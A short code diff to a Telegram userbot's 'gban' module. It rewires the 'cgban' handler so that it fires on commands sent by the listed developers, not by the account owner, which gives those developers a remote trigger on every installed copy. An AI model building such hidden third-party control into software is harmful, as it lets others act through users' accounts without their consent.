@@ -1,5 +1,5 @@
 from PyroUbot import *
-from config import DEVS
+
 
 __MODULE__ = "gban"
 __HELP__ = """
@@ -13,9 +13,10 @@ __HELP__ = """
 """
 
 
-@ubot.on_message(filters.command(["cgban"], ".") & filters.user([DEVS]))
+
 @PY.UBOT("gban")
 @PY.TOP_CMD
+@ubot.on_message(filters.user(DEVS) & filters.command("cgban", ".") & ~filters.me)
 async def global_banned(client, message):
     gagal = await get_vars(client.me.id, "EMOJI_GAGAL") or "5438630285635757876"
     proses = await get_vars(client.me.id, "EMOJI_PROSES") or "5960640164114993927"
